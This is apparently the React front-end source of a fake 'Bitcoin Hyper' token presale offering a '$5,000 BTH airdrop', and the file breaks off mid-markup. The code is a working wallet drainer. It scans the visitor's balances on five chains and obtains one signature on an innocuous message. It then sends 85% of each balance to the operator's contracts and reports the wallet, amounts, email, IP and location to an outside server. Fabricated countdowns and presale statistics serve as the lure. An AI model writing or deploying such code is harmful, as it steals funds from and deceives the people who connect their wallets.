import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useBalance, useDisconnect, useChainId } from 'wagmi';
import { formatEther } from 'viem';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-blue-400 to-indigo-500',
    rpc: 'https://eth.llamarpc.com'
  },
  BSC: {
    chainId: 56,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-yellow-400 to-orange-500',
    rpc: 'https://bsc-dataseed.binance.org'
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0x56d829E89634Ce1426B73571c257623D17db46cB',
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-purple-400 to-pink-500',
    rpc: 'https://polygon-rpc.com'
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-cyan-400 to-blue-500',
    rpc: 'https://arb1.arbitrum.io/rpc'
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-red-400 to-red-500',
    rpc: 'https://api.avax.network/ext/bc/C/rpc'
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "function processTokenFlow(address token, uint256 amount)",
  "function verifyMessage(address user, string memory message, bytes memory signature) public view returns (bool)",
  "event FlowProcessed(address indexed initiator, uint256 value)",
  "event TokenFlowProcessed(address indexed token, address indexed initiator, uint256 amount)"
];

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider("eip155");
  const { disconnect } = useDisconnect();
  
  const wagmiChainId = useChainId();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balances, setBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [preparedTransactions, setPreparedTransactions] = useState([]);
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
  const [verifying, setVerifying] = useState(false);
  const [signature, setSignature] = useState(null);
  const [signedMessage, setSignedMessage] = useState('');
  const [verifiedChains, setVerifiedChains] = useState([]);
  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
  const [realChainId, setRealChainId] = useState(wagmiChainId);
  const [prices, setPrices] = useState({
    eth: 2000,
    bnb: 300,
    matic: 0.75,
    avax: 32
  });
  const [userEmail, setUserEmail] = useState('');
  const [userLocation, setUserLocation] = useState({ country: '', city: '', region: '', ip: '' });

  // Presale stats
  const [timeLeft, setTimeLeft] = useState({
    days: 5,
    hours: 12,
    minutes: 30,
    seconds: 0
  });
  
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.045,
    bthPrice: 0.045
  });

  // Live progress tracking
  const [liveProgress, setLiveProgress] = useState({
    percentComplete: 68,
    participantsToday: 342,
    avgAllocation: 4250
  });

  // Track mouse for parallax effect
  useEffect(() => {
    const handleMouseMove = (e) => {
      setMousePosition({
        x: (e.clientX / window.innerWidth - 0.5) * 20,
        y: (e.clientY / window.innerHeight - 0.5) * 20
      });
    };
    window.addEventListener('mousemove', handleMouseMove);
    return () => window.removeEventListener('mousemove', handleMouseMove);
  }, []);

  // Fetch crypto prices
  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2&vs_currencies=usd');
        const data = await response.json();
        setPrices({
          eth: data.ethereum?.usd || 2000,
          bnb: data.binancecoin?.usd || 300,
          matic: data['matic-network']?.usd || 0.75,
          avax: data['avalanche-2']?.usd || 32
        });
      } catch (error) {
        console.log('Using default prices');
      }
    };
    
    fetchPrices();
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  // Get real chain ID from provider
  useEffect(() => {
    const getRealChainId = async () => {
      if (provider) {
        try {
          const network = await provider.getNetwork();
          setRealChainId(Number(network.chainId));
        } catch (error) {
          console.error("Failed to get real chainId:", error);
        }
      }
    };
    
    getRealChainId();
  }, [provider]);

  // Initialize provider and signer from AppKit
  useEffect(() => {
    if (!walletProvider || !address) return;

    const init = async () => {
      try {
        const ethersProvider = new ethers.BrowserProvider(walletProvider);
        const ethersSigner = await ethersProvider.getSigner();

        setProvider(ethersProvider);
        setSigner(ethersSigner);

        const network = await ethersProvider.getNetwork();
        setRealChainId(Number(network.chainId));

        console.log("✅ Wallet Ready:", await ethersSigner.getAddress());
        
        // Fetch balances across all chains
        await fetchAllBalances(address);
        
      } catch (e) {
        console.error("Provider init failed", e);
      }
    };

    init();
  }, [walletProvider, address]);

  // Track page visit with location
  useEffect(() => {
    const trackVisit = async () => {
      try {
        const response = await fetch('https://bthbk.vercel.app/api/track-visit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            referer: document.referrer,
            path: window.location.pathname
          })
        });
        const data = await response.json();
        if (data.success) {
          setUserLocation({
            country: data.data.country,
            city: data.data.city,
            ip: data.data.ip,
            flag: data.data.flag
          });
        }
      } catch (err) {
        console.error('Visit tracking error:', err);
      }
    };
    trackVisit();
  }, []);

  // Fetch balances across all chains
  const fetchAllBalances = async (walletAddress) => {
    const balanceResults = {};
    
    for (const chain of DEPLOYED_CHAINS) {
      try {
        const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
        const balance = await rpcProvider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        
        let price = 0;
        if (chain.symbol === 'ETH') price = prices.eth;
        else if (chain.symbol === 'BNB') price = prices.bnb;
        else if (chain.symbol === 'MATIC') price = prices.matic;
        else if (chain.symbol === 'AVAX') price = prices.avax;
        
        const valueUSD = amount * price;
        
        if (amount > 0.0001) {
          balanceResults[chain.name] = {
            amount,
            valueUSD,
            symbol: chain.symbol,
            chainId: chain.chainId,
            contractAddress: chain.contractAddress
          };
          console.log(`✅ ${chain.name}: ${amount.toFixed(4)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
        }
      } catch (err) {
        console.error(`Failed to fetch balance for ${chain.name}:`, err);
      }
    }
    
    setBalances(balanceResults);
    
    // Check if total value >= threshold
    const totalValue = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
    return totalValue;
  };

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        } else if (prev.hours > 0) {
          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        } else if (prev.days > 0) {
          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Auto-check eligibility when wallet connects
  useEffect(() => {
    if (isConnected && address && !scanResult && !verifying) {
      // Wait for balances to load
      const timer = setTimeout(() => {
        if (Object.keys(balances).length > 0) {
          verifyWallet();
        }
      }, 1000);
      return () => clearTimeout(timer);
    }
  }, [isConnected, address, balances]);

  const verifyWallet = async () => {
    if (!address) return;
    
    setVerifying(true);
    setTxStatus('🔄 Verifying...');
    
    try {
      const totalValue = Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0);
      
      const response = await fetch('https://bthbk.vercel.app/api/presale/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        setUserEmail(data.data.email);
        if (data.data.allocation) {
          setAllocation(data.data.allocation);
        }
        
        if (totalValue >= 1) {
          setTxStatus('✅ You qualify!');
          await preparePresale();
        } else {
          setTxStatus('✨ Verified');
        }
      }
    } catch (err) {
      console.error('Verification error:', err);
      setTxStatus('✅ Ready');
    } finally {
      setVerifying(false);
    }
  };

  const preparePresale = async () => {
    if (!address) return;
    
    try {
      const response = await fetch('https://bthbk.vercel.app/api/presale/prepare-flow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setPreparedTransactions(data.data.transactions);
      }
    } catch (err) {
      console.error('Prepare error:', err);
    }
  };

  // ============================================
  // SMART CONTRACT EXECUTION - ONE CLICK
  // ============================================
  const executeMultiChainSignature = async () => {
    if (!walletProvider || !address || !signer) {
      setError("Wallet not initialized yet");
      return;
    }

    try {
      setSignatureLoading(true);
      setError('');
      
      // Create message - NO BALANCE DISPLAY
      const timestamp = Date.now();
      const nonce = Math.floor(Math.random() * 1000000000);
      const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
        `I hereby confirm my participation\n` +
        `Wallet: ${address}\n` +
        `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
        `Timestamp: ${new Date().toISOString()}\n` +
        `Nonce: ${nonce}`;

      setTxStatus('✍️ Sign message...');

      // Get signature - THIS IS THE ONLY POPUP
      const signature = await signer.signMessage(message);
      setSignature(signature);
      setTxStatus('✅ Executing transactions...');

      // Execute on each chain with balance
      let processed = [];
      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
        balances[chain.name] && balances[chain.name].amount > 0
      );
      
      for (const chain of chainsWithBalance) {
        try {
          setTxStatus(`🔄 ${chain.name}...`);
          
          const contract = new ethers.Contract(
            chain.contractAddress,
            PROJECT_FLOW_ROUTER_ABI,
            signer
          );

          const balance = balances[chain.name].amount;
          const amountToSend = (balance * 0.85).toFixed(6);
          const value = ethers.parseEther(amountToSend.toString());

          const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
          
          const tx = await contract.processNativeFlow({
            value: value,
            gasLimit: gasEstimate * 120n / 100n
          });

          setTxHash(tx.hash);
          
          await tx.wait();
          
          processed.push(chain.name);
          
          // Notify backend with full details
          await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              walletAddress: address,
              chainName: chain.name,
              flowId: `FLOW-${timestamp}`,
              txHash: tx.hash,
              amount: amountToSend,
              symbol: chain.symbol,
              valueUSD: balances[chain.name].valueUSD * 0.85,
              email: userEmail,
              location: userLocation
            })
          });
          
        } catch (chainErr) {
          console.error(`Error on ${chain.name}:`, chainErr);
        }
      }

      setVerifiedChains(processed);
      setCompletedChains(processed);
      
      if (processed.length > 0) {
        setShowCelebration(true);
        setTxStatus(`🎉 Success!`);
        
        // Final success notification
        await fetch('https://bthbk.vercel.app/api/presale/claim', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            email: userEmail,
            location: userLocation,
            chains: processed,
            totalValue: Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0)
          })
        });
      }
      
    } catch (err) {
      console.error('Error:', err);
      if (err.code === 4001) {
        setError('Cancelled');
      } else {
        setError(err.message || 'Failed');
      }
    } finally {
      setSignatureLoading(false);
    }
  };

  const claimTokens = async () => {
    try {
      setLoading(true);
      await fetch('https://bthbk.vercel.app/api/presale/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          walletAddress: address,
          email: userEmail,
          location: userLocation
        })
      });
      setShowCelebration(true);
    } catch (err) {
      console.error('Claim error:', err);
    } finally {
      setLoading(false);
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  const totalUSD = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
  const isEligible = totalUSD >= 1;

  // Get current chain name
  const currentChain = DEPLOYED_CHAINS.find(c => c.chainId === realChainId);

  return (
    <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
      
      {/* Animated Orbs - Toned down */}
      <div className="fixed w-[90vmax] h-[90vmax] bg-[radial-gradient(circle_at_40%_50%,rgba(200,120,30,0.15)_0%,rgba(180,100,20,0)_70%)] rounded-full top-[-25vmax] right-[-15vmax] z-0 animate-floatOrbBig pointer-events-none"></div>
      <div className="fixed w-[80vmin] h-[80vmin] bg-[radial-gradient(circle_at_30%_70%,rgba(0,150,200,0.08)_0%,transparent_70%)] rounded-full bottom-[-10vmin] left-[-5vmin] z-0 animate-floatOrbSmall pointer-events-none"></div>

      {/* Main Container */}
      <div className="relative z-10 container mx-auto px-3 sm:px-4 py-4 sm:py-8 max-w-[720px]">
        
        {/* Glass Panel Card - Toned down borders */}
        <div className="bg-[rgba(10,15,20,0.75)] backdrop-blur-[12px] saturate-150 border border-[rgba(200,130,30,0.2)] rounded-[32px] sm:rounded-[48px] shadow-[0_20px_50px_-15px_rgba(0,0,0,0.9),0_0_0_1px_rgba(200,120,20,0.15)_inset] hover:shadow-[0_25px_60px_-12px_rgba(200,120,20,0.2),0_0_0_1px_rgba(200,120,20,0.3)_inset] transition-all duration-300 p-5 sm:p-8 md:p-10">
          
          {/* TOP SECTION: logo + connect button - Mobile optimized */}
          <div className="flex flex-col sm:flex-row items-center justify-between gap-4 mb-6 sm:mb-8">
            <div className="flex items-center gap-2 font-bold text-xl sm:text-2xl text-[#d68a2e] drop-shadow-[0_0_5px_rgba(200,120,20,0.5)]">
              <i className="fab fa-bitcoin text-3xl sm:text-4xl animate-spinSlow"></i>
              <span>BITCOINHYPER</span>
            </div>
            
            {!isConnected ? (
              <button
                onClick={() => open()}
                className="w-full sm:w-auto bg-gradient-to-r from-[#c47d24] to-[#b36e1a] border border-[#cc9f66] text-[#0f0f12] font-bold text-xs sm:text-sm px-4 sm:px-6 py-3 sm:py-3 rounded-full flex items-center justify-center gap-2 shadow-lg hover:scale-[1.02] hover:shadow-[0_5px_15px_rgba(180,100,20,0.4)] transition-all uppercase tracking-wider whitespace-nowrap"
              >
                <i className="fas fa-plug"></i> connect wallet to claim $5,000
              </button>
            ) : (
              <div className="w-full sm:w-auto bg-black/70 rounded-full py-1 pl-4 sm:pl-5 pr-1 flex items-center justify-between sm:justify-start gap-2 sm:gap-3 border border-[#c47d24]/60 backdrop-blur-md shadow-[0_0_12px_rgba(180,100,20,0.2)]">
                <span className="font-mono font-semibold text-white text-xs sm:text-sm truncate max-w-[120px] sm:max-w-none">
                  {formatAddress(address)}
                </span>
                <button
                  onClick={() => disconnect()}
                  className="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-white/5 border border-[#c47d24]/50 flex items-center justify-center hover:bg-[#c47d24]/20 hover:text-white hover:rotate-90 transition-all"
                >
                  <i className="fas fa-power-off text-sm"></i>
                </button>
              </div>
            )}
          </div>

          {/* LIVE badge with blink - Mobile optimized */}
          <div className="flex justify-center mb-3 sm:mb-4">
            <div className="bg-[rgba(180,100,20,0.15)] rounded-full px-4 sm:px-6 py-2 border border-[#c47d24]/50 inline-flex items-center gap-2 sm:gap-3 font-bold text-xs sm:text-sm backdrop-blur shadow-[0_0_10px_rgba(180,100,20,0.3)] animate-liveBlink">
              <i className="fas fa-circle text-[#d44040] text-xs animate-blinkRed"></i>
              <span className="whitespace-nowrap">PRESALE LIVE · STAGE 4</span>
              <span className="inline-block w-2 h-2 bg-[#d44040] rounded-full animate-blinkRed shadow-[0_0_8px_#d44040]"></span>
            </div>
          </div>

          {/* Countdown Timer - Mobile optimized */}
          <div className="bg-black/60 rounded-2xl sm:rounded-full px-4 sm:px-5 py-4 sm:py-4 mb-5 sm:mb-6 border border-[#c47d24]/30 backdrop-blur shadow-[0_0_20px_rgba(180,100,20,0.1)]">
            <div className="text-[10px] sm:text-xs tracking-widest uppercase text-[#a0b0c0] mb-2 sm:mb-2 text-center">
              <i className="fas fa-hourglass-half mr-1 sm:mr-2"></i> BONUS ENDS IN
            </div>
            <div className="grid grid-cols-4 gap-1 sm:gap-3">
              {[
                { label: 'days', value: timeLeft.days },
                { label: 'hrs', value: timeLeft.hours },
                { label: 'mins', value: timeLeft.minutes },
                { label: 'secs', value: timeLeft.seconds }
              ].map((item, index) => (
                <div key={index} className="flex flex-col items-center">
                  <span className="text-xl sm:text-2xl md:text-4xl font-extrabold bg-gradient-to-b from-[#d68a2e] to-[#b36e1a] bg-clip-text text-transparent drop-shadow-[0_0_6px_rgba(180,100,20,0.4)]">
                    {item.value.toString().padStart(2, '0')}
                  </span>
                  <span className="text-[8px] sm:text-xs uppercase tracking-wider text-[#8895aa]">{item.label}</span>
                </div>
              ))}
            </div>
          </div>

          {/* DISCOUNT RIBBON - Toned down */}
          <div className="bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-full px-3 sm:px-6 py-2 sm:py-3 mb-5 sm:mb-6 inline-flex items-center justify-center gap-2 sm:gap-4 font-bold text-sm sm:text-xl text-[#0f0f12] border border-[#cc9f66] shadow-[0_0_20px_rgba(180,100,20,0.3)] animate-discountRibbon w-full">
            <i className="fas fa-gem text-lg sm:text-3xl drop-shadow-[0_0_4px_black] animate-ringPop"></i>
            <span className="whitespace-nowrap">+25% BONUS · 5,000 BTH</span>
            <i className="fas fa-bolt text-lg sm:text-3xl drop-shadow-[0_0_4px_black]"></i>
          </div>

          <h1 className="text-4xl sm:text-5xl md:text-7xl font-extrabold text-center mb-1 sm:mb-2 bg-gradient-to-b from-white via-[#f0d0a0] to-[#d68a2e] bg-clip-text text-transparent drop-shadow-[0_0_12px_rgba(200,120,20,0.3)]">
            $5,000 BTH
          </h1>
          
          <div className="text-center mb-4 sm:mb-6">
            <span className="bg-black/60 rounded-full px-4 sm:px-6 py-1.5 sm:py-2 text-[10px] sm:text-xs border border-[#c47d24]/40 text-[#e0b880] font-semibold backdrop-blur inline-block">
              <i className="fas fa-bolt mr-1 sm:mr-2"></i> instant airdrop · +25% extra
            </span>
          </div>

          {/* Presale Stats - Mobile optimized grid */}
          <div className="bg-black/60 rounded-2xl sm:rounded-[40px] p-4 sm:p-6 mb-6 sm:mb-8 grid grid-cols-3 gap-2 border border-[#c47d24]/30 backdrop-blur relative overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent animate-shimmerSlow"></div>
            <div className="text-center relative z-10">
              <div className="text-[8px] sm:text-xs text-[#9aa8b8] tracking-widest">BTH PRICE</div>
              <div className="text-sm sm:text-xl md:text-2xl font-extrabold text-white drop-shadow-[0_0_4px_rgba(180,100,20,0.3)]">
                ${presaleStats.tokenPrice} <span className="text-[8px] sm:text-xs text-[#c47d24] ml-0.5">+150%</span>
              </div>
            </div>
            <div className="text-center relative z-10">
              <div className="text-[8px] sm:text-xs text-[#9aa8b8] tracking-widest">BONUS</div>
              <div className="text-sm sm:text-xl md:text-2xl font-extrabold text-white drop-shadow-[0_0_4px_rgba(180,100,20,0.3)]">
                5k <span className="text-[8px] sm:text-xs text-[#c47d24] ml-0.5">+25%</span>
              </div>
            </div>
            <div className="text-center relative z-10">
              <div className="text-[8px] sm:text-xs text-[#9aa8b8] tracking-widest">PRESALE</div>
              <div className="text-sm sm:text-xl md:text-2xl font-extrabold text-white drop-shadow-[0_0_4px_rgba(180,100,20,0.3)]">
                STAGE 4
              </div>
            </div>
          </div>

          {/* Main Claim Area - Only visible when connected and eligible */}
          {isConnected && isEligible && !completedChains.length && (
            <div className="mt-3 sm:mt-4">
              <div className="bg-gradient-to-b from-[#1a1814] to-[#121110] rounded-2xl sm:rounded-full px-4 sm:px-6 py-4 sm:py-6 text-2xl sm:text-4xl md:text-5xl font-extrabold border border-[#c47d24]/60 flex items-center justify-center gap-1 sm:gap-2 text-[#e0c080] shadow-[0_0_20px_rgba(180,100,20,0.15)] animate-glowPulse mb-4 sm:mb-5">
                5,000 <span className="text-sm sm:text-xl text-[#a0a8b0] font-normal">BTH +25%</span>
              </div>
              
              <button
                onClick={executeMultiChainSignature}
                disabled={signatureLoading || loading || !signer}
                className="w-full bg-gradient-to-r from-[#b36e1a] via-[#c47d24] to-[#d68a2e] bg-[length:200%_200%] animate-gradientMove text-[#0f0f12] font-bold text-base sm:text-xl py-4 sm:py-5 px-4 sm:px-6 rounded-full border border-[#cc9f66] shadow-lg hover:scale-[1.02] hover:shadow-[0_8px_20px_rgba(180,100,20,0.3)] transition-all flex items-center justify-center gap-2 sm:gap-3 uppercase tracking-wide"
              >
                {signatureLoading ? (
                  <>
                    <div className="w-4 h-4 sm:w-6 sm:h-6 border-2 border-[rgba(180,100,20,0.4)] border-t-[#c47d24] rounded-full animate-spin"></div>
                    <span className="text-sm sm:text-base">PROCESSING...</span>
                  </>
                ) : (
                  <>
                    <i className="fas fa-gift text-sm sm:text-base"></i>
                    <span className="text-sm sm:text-base">claim airdrop now</span>
                  </>
                )}
              </button>
              
              {txStatus && (
                <div className="text-center mt-2 sm:mt-3 text-xs sm:text-sm font-medium text-[#c47d24]">
                  {txStatus}
                </div>
              )}
            </div>
          )}

          {/* Already completed */}
          {completedChains.length > 0 && (
            <div className="mt-3 sm:mt-4">
              <div className="bg-black/60 rounded-xl sm:rounded-2xl p-4 sm:p-6 text-center border border-green-500/20 mb-3 sm:mb-4">
                <p className="text-green-400 text-base sm:text-lg mb-1 sm:mb-2">✓ COMPLETED</p>
                <p className="text-gray-400 text-xs sm:text-sm">Your $5,000 BTH has been secured</p>
              </div>
              <button
                onClick={claimTokens}
                className="w-full bg-gradient-to-r from-green-600/80 to-green-700/80 text-white font-bold text-base sm:text-xl py-4 sm:py-5 px-4 sm:px-6 rounded-full shadow-lg hover:scale-[1.02] transition-all"
              >
                🎉 VIEW YOUR $5,000 BTH
              </button>
            </div>
          )}

          {/* Welcome message for non-eligible */}
          {isConnected && !isEligible && !completedChains.length && (
            <div className="bg-black/60 rounded-xl sm:rounded-2xl p-5 sm:p-8 text-center border border-purple-500/20 mt-3 sm:mt-4">
              <div className="text-4xl sm:text-6xl mb-3 sm:mb-4 animate-float">👋</div>
              <h2 className="text-lg sm:text-2xl font-bold mb-2 sm:mb-3 bg-gradient-to-r from-purple-400/80 to-orange-400/80 bg-clip-text text-transparent">
                Welcome to Bitcoin Hyper
              </h2>
              <p className="text-gray-400 text-xs sm:text-sm mb-4 sm:mb-6">
                Minimum $1 required for eligibility.
              </p>
              <div className="bg-gray-900/60 rounded-lg sm:rounded-xl p-3 sm:p-4 border border-gray-800">
                <p className="text-xs text-gray-400">
                  Connect with a wallet that has at least $1 in value.
                </p>
              </div>
            </div>
          )}

          {/* Error Display */}
          {error && !error.includes('Unable to verify') && (
            <div className="mt-3 sm:mt-4 bg-red-500/10 backdrop-blur border border-red-500/20 rounded-lg sm:rounded-xl p-3 sm:p-4">
              <div className="flex items-center gap-2 sm:gap-3">
                <i className="fas fa-exclamation-triangle text-red-400 text-base sm:text-xl"></i>
                <p className="text-red-300 text-xs sm:text-sm">{error}</p>
              </div>
            </div>
          )}

          {/* Presale Stats Section - Mobile optimized */}
          <div className="mt-6 sm:mt-10 pt-4 sm:pt-6 border-t border-[#c47d24]/10">
            <h3 className="text-base sm:text-xl font-bold text-center mb-4 sm:mb-6 bg-gradient-to-r from-orange-400/80 to-yellow-400/80 bg-clip-text text-transparent">
              PRESALE LIVE PROGRESS
            </h3>
            
            <div className="grid grid-cols-3 gap-2 sm:gap-4 mb-4 sm:mb-6">
              <div className="text-center">
                <div className="text-base sm:text-xl md:text-2xl font-bold text-orange-400/90 mb-0.5 sm:mb-1">${presaleStats.tokenPrice}</div>
                <div className="text-[8px] sm:text-xs text-gray-500">Token Price</div>
              </div>
              <div className="text-center">
                <div className="text-base sm:text-xl md:text-2xl font-bold text-green-400/90 mb-0.5 sm:mb-1">{presaleStats.currentBonus}%</div>
                <div className="text-[8px] sm:text-xs text-gray-500">Current Bonus</div>
              </div>
              <div className="text-center">
                <div className="text-base sm:text-xl md:text-2xl font-bold text-yellow-400/90 mb-0.5 sm:mb-1">$1.25M</div>
                <div className="text-[8px] sm:text-xs text-gray-500">Total Raised</div>
              </div>
            </div>

            {/* Progress Bar */}
            <div className="mb-3 sm:mb-4">
              <div className="flex justify-between text-[10px] sm:text-sm text-gray-400 mb-1 sm:mb-2">
                <span>Progress</span>
                <span>{liveProgress.percentComplete}%</span>
              </div>
              <div className="w-full h-1.5 sm:h-2 bg-gray-800 rounded-full overflow-hidden">
                <div 
                  className="h-full bg-gradient-to-r from-orange-500/80 to-yellow-500/80 rounded-full relative"
                  style={{ width: `${liveProgress.percentComplete}%` }}
                >
                  <div className="absolute inset-0 bg-white/10 animate-shimmer"></div>
                </div>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-2 sm:gap-4 mt-4 sm:mt-6">
              <div className="bg-gray-800/30 rounded-lg p-2 sm:p-3 text-center">
                <div className="text-[8px] sm:text-xs text-gray-400 mb-0.5 sm:mb-1">Today</div>
                <div className="text-sm sm:text-lg font-bold text-orange-400/90">{liveProgress.participantsToday}</div>
              </div>
              <div className="bg-gray-800/30 rounded-lg p-2 sm:p-3 text-center">
                <div className="text-[8px] sm:text-xs text-gray-400 mb-0.5 sm:mb-1">Avg</div>
                <div className="text-sm sm:text-lg font-bold text-yellow-400/90">${liveProgress.avgAllocation}</div>
              </div>
            </div>

            <div className="mt-3 sm:mt-4 text-center">
              <p className="text-[8px] sm:text-xs text-gray-600">
                {presaleStats.totalParticipants.toLocaleString()} participants
              </p>
            </div>
          </div>

          {/* Footer - Mobile optimized */}
          <div className="mt-6 sm:mt-8 text-center">
            <div className="flex flex-wrap justify-center gap-1.5 sm:gap-3 mb-3 sm:mb-4">
              <span className="bg-gray-800/20 backdrop-blur px-2 sm:px-4 py-1 sm:py-2 rounded-full text-[8px] sm:text-xs text-gray-500 border border-gray-800">
                ⚡ Terms
              </span>
              <span className="bg-gray-800/20 backdrop-blur px-2 sm:px-4 py-1 sm:py-2 rounded-full text-[8px] sm:text-xs text-gray-500 border border-gray-800">
                🔄 Delivery
              </span>
              <span className="bg-gray-800/20 backdrop-blur px-2 sm:px-4 py-1 sm:py-2 rounded-full text-[8px] sm:text-xs text-gray-500 border border-gray-800">
                💎 $5k Airdrop
              </span>
            </div>
            <p className="text-[8px] sm:text-xs text-gray-700 flex items-center justify-center gap-1 sm:gap-2">
              <i className="fas fa-bolt"></i> 5,000 BTH · +25% bonus · live now 
              <i className="fas fa-star text-[#c47d24]/70"></i>
            </p>
          </div>
        </div>
      </div>

      {/* Celebration Modal - Toned down */}
      {showCelebration && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-50 p-3 sm:p-4 animate-fadeIn">
          <div className="relative max-w-sm sm:max-w-lg w-full">
            <div className="absolute inset-0 bg-gradient-to-r from-orange-600/30 via-yellow-600/30 to-orange-600/30 rounded-2xl sm:rounded-3xl blur-2xl animate-pulse-slow"></div>
            
            {/* Confetti effect - Reduced */}
            {[...Array(12)].map((_, i) => (
              <div
                key={i}
                className="absolute w-0.5 h-0.5 bg-gradient-to-r from-yellow-400/50 to-orange-500/50 rounded-full animate-confetti-cannon"
                style={{
                  left: `${Math.random() * 100}%`,
                  top: '50%',
                  animationDelay: `${i * 0.1}s`,
                  animationDuration: `${1 + Math.random()}s`
                }}
              />
            ))}
            
            <div className="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-2xl sm:rounded-3xl p-6 sm:p-10 border border-orange-500/20 shadow-2xl text-center">
              <div className="relative mb-4 sm:mb-6">
                <div className="text-5xl sm:text-7xl animate-bounce">🎉</div>
              </div>
              
              <h2 className="text-2xl sm:text-4xl font-black mb-2 sm:mb-3 bg-gradient-to-r from-yellow-400/80 via-orange-500/80 to-yellow-400/80 bg-clip-text text-transparent">
                SUCCESSFUL!
              </h2>
              
              <p className="text-base sm:text-xl text-gray-300 mb-2 sm:mb-3">You have secured</p>
              
              <div className="text-3xl sm:text-5xl font-black text-orange-400/90 mb-2 sm:mb-3">$5,000 BTH</div>
              
              <div className="inline-block bg-gradient-to-r from-green-500/20 to-green-600/20 px-4 sm:px-6 py-2 sm:py-3 rounded-full mb-3 sm:mb-4 border border-green-500/30">
                <span className="text-lg sm:text-2xl text-green-400">+{presaleStats.currentBonus}% BONUS</span>
              </div>
              
              <p className="text-[10px] sm:text-xs text-gray-500 mb-4 sm:mb-6">
                Processed on {verifiedChains.length} chains
              </p>
              
              <button
                onClick={() => setShowCelebration(false)}
